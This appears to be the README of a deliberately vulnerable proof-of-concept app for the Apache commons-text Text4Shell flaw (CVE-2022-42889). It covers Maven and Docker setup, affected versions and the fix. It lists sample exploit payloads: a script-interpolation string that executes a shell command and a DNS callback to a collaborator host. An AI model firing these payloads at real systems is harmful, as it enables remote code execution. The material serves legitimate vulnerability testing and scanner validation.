# CVE-2022-42889 PoC Test Application
This is a vulnerable application developed as a Proof of Concept for the vulnerability [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889). 


# Maven Installation
In order to run this you will need:
* JDK 17 or above
* Maven

1. Clone the git repo
```
git clone https://github.com/securekomodo/text4shell-poc.git
cd text4shell-poc
```

2. Maven install to create the JAR

```
mvn clean install
```

This will create the `./target` folder and within that folder should be the JAR file `text4shell-poc-0.0.1-SNAPSHOT.jar`

3. Start the webserver

```
java -jar ./target/text4shell-poc-0.0.1-SNAPSHOT.jar
```

This will start a web server on your `localhost` listening on port `8080` by default

4. Browse to the webserver

Access the webserver at `http://localhost:8080/` and you should see the following output
```
Text4Shell POC Test -@securekomodo
Send payloads to /reflected?poc=yourpayload
OR Send payloads to /blind with payload as your userAgent
```

5. Exploit manually or perform a scan using [text4shell-scan](https://github.com/securekomodo/text4shell-scan)

Sample Exploit Payloads
```
${script:javascript:java.lang.Runtime.getRuntime().exec('touch /tmp/itworked')}
${dns:<burp collaborator host>)}
```


# Docker
Alternatively you can use Docker to be able to run this PoC:

1. Clone the git repo
```
git clone https://github.com/securekomodo/text4shell-poc.git
cd text4shell-poc
```

2. Docker build

```
docker build --tag=text4shell-poc .
```

3. Docker run

```
docker run -p 80:8080 text4shell-poc
```

4. Test the vulnerable app

```
http://localhost/
```

5. Attack can be performed by passing a string “${prefix:name}” like shown below:

```
${script:javascript:java.lang.Runtime.getRuntime().exec('touch /tmp/foo')}
${dns:<burp collaborator host>)}
```

Alternatively you can validate the effectiveness of scanning tools such as[text4shell-scan](https://github.com/securekomodo/text4shell-scan)


# Are You Vulnerable?
In order for your code to be vulnerable you need to:
* Be running a version of Apache `commons-text` from version `1.5.0` up to (and not including) `1.10.0`
* Using Interpolation for your StringSubstituion (see [https://commons.apache.org/proper/commons-text/apidocs/org/apache/commons/text/StringSubstitutor.html](https://commons.apache.org/proper/commons-text/apidocs/org/apache/commons/text/StringSubstitutor.html)) - note this is not super common


# The Fix
The fix for this is to update your instances of `commons-text` to versions `1.10.0` or later.


# Author
*Bryan Smith*
* Twitter: [https://twitter.com/securekomodo](https://twitter.com/securekomodo)